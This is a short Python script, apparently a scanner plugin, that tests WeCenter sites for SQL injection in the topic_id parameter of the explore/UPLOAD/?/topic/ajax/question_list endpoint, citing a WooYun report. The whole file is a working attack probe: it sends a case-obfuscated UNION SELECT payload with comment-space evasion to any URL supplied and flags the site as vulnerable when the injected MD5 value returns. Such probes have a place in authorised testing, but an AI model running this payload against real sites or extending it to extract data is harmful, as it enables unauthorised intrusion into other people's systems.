#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: wecenter SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-0106369
author: Lucifer
description: 文件explore/UPLOAD/?/topic/ajax/question_list中,参数topic_id存在SQL注入。
'''
import sys
import requests
import warnings
from termcolor import cprint

class wecenter_topic_id_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/explore/UPLOAD/?/topic/ajax/question_list/type-best&topic_id=1%29UnIoN/**/SeLeCt/**/Md5(1234)%23"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                cprint("[+]存在wecenter SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = wecenter_topic_id_sqli_BaseVerify(sys.argv[1])
    testVuln.run()